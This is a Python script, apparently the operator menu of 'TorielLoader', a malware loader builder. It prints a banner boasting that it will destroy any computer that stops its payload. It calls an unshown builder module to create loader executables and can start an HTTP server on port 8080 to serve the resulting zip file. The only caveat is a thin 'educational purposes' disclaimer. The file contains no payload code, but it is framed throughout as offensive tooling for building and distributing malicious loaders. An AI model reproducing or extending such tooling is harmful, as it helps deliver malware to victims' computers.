import os
import sys
import platform
import subprocess
from colorama import Fore, Style
from builder import main as build_loader

banner = '''
                  @@@       @@@                  
                 @  @       @  @                 
               @@ @@         @@ @@               
              @  @             @  @              
            @@      @       @      @@            
            @@   @@@         @@@@@ @@            
           @                         @           
         @@      @@@@     @@@@@       @@         
         @@    @@@           @@@      @@         
         @@      @  @     @@ @@       @@         
         @@   @     @     @@      @   @@         
         @@    @@               @@    @@         
         @@      @             @      @@         
           @     @   @@   @@   @     @           
         @@@     @@@   @@@   @@@     @@@         
        @***@@   @*************@   @@***@        
      @@   @*************************@   @@      
     @     @******#*#****************@     @     
     @      @@#@@@@@*********@@@@@*@@      @     
     @        @*****@@@@@@@@@*****@        @     
     @      @@@** ###*******### **@@@      @     
      @@      @***   ** #***   ***@      @@      
      @@       @@***************@@       @@      
      @@       @@*** ******* ***@@       @@      
        @        @*************@        @        
         @@          @@   @@          @@         
         @@          @@   @@          @@         
         @@@        @       @        @@@         
         @@*@@@@@   @@@@@@@@@     @@@*@@         
         @@*#****@@@@*******@@@@@@****@@         
        @*******************#***********@        
        @*******************************@        
        @*#****************#***********#@        
        @***#*********#*#**#************@        
              @@@@*********#***@@@@              
              @   @@@@@@@@@@@@@   @              
              @      @@ @@        @              
           @@@       @@ @@         @@@           
         @@         @@@ @@@@          @@         
           @@@@@@               @@@@@@           
                                                 
                TorielLoader v1.0

              i am motherly and kind to my child who operates me,
              but i will not hesitate to destroy
              any computer that tries to
              stop me and my child from running my payload.

              please don't and abuse me for malicious purposes.

              created by: v1s0or
              Welcome, my child.
'''

print(Fore.MAGENTA + banner + Style.RESET_ALL)

def check_py_version():
    if sys.version_info >= (3, 6):
        print(Fore.GREEN + "Python Version is A-OK!" + Style.RESET_ALL + "\n")
        return True
    else:
        print(Fore.RED + "Python Version is not supported! Please use Python 3.6 or higher." + Style.RESET_ALL)
        return False
def main():
    check_py_version()
    userinput = input("TORIEL >> ").lower()
    if userinput == "exit":
        print(Fore.YELLOW + "[-] Exiting TorielLoader... (goodbye, my child ill miss you...)" + Style.RESET_ALL)
        sys.exit(0)
    elif userinput == "start":
        print(Fore.GREEN + "[+] Starting TorielLoader..." + Style.RESET_ALL)
        build_loader()
    elif userinput == "startserver":
        print(Fore.YELLOW + "[*] Starting the server..." + Style.RESET_ALL)
        directory = input('Enter the directory to serve the zip file: ')
        if platform.system() == "Windows":
            subprocess.run(["python", "-m", "http.server", "8080", "--directory", directory])
            print(Fore.GREEN + '[*] Server started at port 8080' + Style.RESET_ALL)
        else:
            subprocess.run(["python3", "-m", "http.server", "8080", "--directory", directory])
            print(Fore.GREEN + '[*] Server started at port 8080' + Style.RESET_ALL)
    elif userinput == "help":
        print(Fore.MAGENTA + """
mom's here to help you, my child.
Available commands:
- start: Build the loader and create the executable.
- startserver: Start a simple HTTP server to serve the zip file.
- exit: Exit the TorielLoader.
- help: Show this help message.
- about: Show information about TorielLoader.
        """ + Style.RESET_ALL)
    elif userinput == "about":
        print(Fore.CYAN + """
Oh, my child, you want to know about me?              

TorielLoader is a Python-based tool designed to create a loader executables.
It is intended for educational purposes and should not be used for malicious activities.
Created by v1s0or, dialog by the character Toriel from the game Undertale. (dialog is not from the game, but inspired by it)
        """ + Style.RESET_ALL)
        main()
    else:
        print(Fore.RED + "[-] Unknown command. Please type 'start' to begin or 'exit' to quit." + Style.RESET_ALL)
        main() 

if __name__ == "__main__":
    main()